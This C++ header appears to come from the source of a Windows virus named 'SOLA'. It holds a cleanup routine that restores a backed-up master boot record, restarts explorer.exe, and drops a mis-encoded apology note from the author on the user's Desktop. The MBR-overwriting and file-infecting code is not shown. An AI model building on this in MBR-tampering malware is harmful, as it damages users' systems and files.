#ifndef THISKILL_H
#define THISKILL_H

#include <windows.h>
#include "changembr.h"
#include <fstream>
#include <windows.h>

using namespace std;

ofstream o;
byte backup[512];

string getuserpath()
{
	char var[]="USERPROFILE"; 
	char userpath[2048];
	GetEnvironmentVariable((LPCSTR)var,(LPSTR)userpath,2048);
	return (string)userpath;
}

void killthis(HWND hwnd)
{
	if(hwnd) ShowWindow(hwnd,SW_HIDE);
	RecovMBR(backup);//recovery the mbr
	system("explorer.exe");
	o.open(getuserpath()+"\\Desktop\\Sola�Իٵ�����.txt");
	o << "��λ���԰������ǣ�"<<endl<<"���á����ȣ����ҶԴ˲������������Ĳ���������Ǹ��"<<endl<<endl<<"SOLA�Ѿ������ļ�����������"<<endl<<"���ļ�����Ѿ�����SOLA"<<endl<<"�ı�ǣ���˲����ظ���Ⱦ��"<<endl<<endl<<"��Ӳ���л����б�SOLA����"<<endl<<"��Ⱦ���ļ������ܲ����ظ���Ⱦ��"<<endl<<"��������������ǡ�"<<endl<<endl<<"ϵͳ���Ѿ���װ��SOLA��רɱ����"<<endl<<"�����԰�����ɨ�貢��������ļ���"<<endl<<endl<<"ף�����ˡ�"<<endl<<endl<<"SOLA��������"<<endl<<"Bob";
	o.flush();
	o.close();
}
#endif
